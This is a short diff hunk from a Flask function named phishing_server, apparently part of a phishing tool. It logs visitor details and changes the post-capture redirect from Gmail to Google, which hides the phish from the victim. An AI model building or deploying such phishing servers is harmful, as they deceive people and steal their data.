@@ -24,7 +24,7 @@ def phishing_server():
                 'platform': request.user_agent.platform,
                 'date': datetime.now().strftime('%H:%m %d-%m-%Y')
             })
-        return redirect("https://www.gmail.com", code=302)
+        return redirect("https://www.google.com", code=302)
     return render_template(target, name='index')
 
 
